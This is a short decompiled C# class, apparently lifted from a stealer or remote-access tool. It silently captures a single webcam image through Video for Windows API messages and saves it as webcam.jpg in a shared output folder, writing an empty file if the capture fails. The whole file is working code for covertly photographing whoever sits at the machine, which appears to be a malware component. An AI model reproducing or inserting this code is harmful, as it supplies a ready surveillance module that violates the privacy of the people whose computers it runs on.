using System;
using System.IO;
using System.Runtime.InteropServices;

// Token: 0x02000015 RID: 21
internal class WebCam
{
	// Token: 0x06000033 RID: 51 RVA: 0x00004A38 File Offset: 0x00002C38
	public static void Start()
	{
		string text = string.Format("{0}webcam.jpg", global::Buffer.path_l);
		try
		{
			IntPtr hWnd = WinApi.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 320, 240, 0, 0);
			WinApi.SendMessage(hWnd, 1034U, 0, 0);
			WinApi.SendMessage(hWnd, 1049U, 0, Marshal.StringToHGlobalAnsi(text).ToInt32());
			WinApi.SendMessage(hWnd, 1035U, 0, 0);
		}
		catch
		{
			File.WriteAllText(text, "");
		}
	}
}
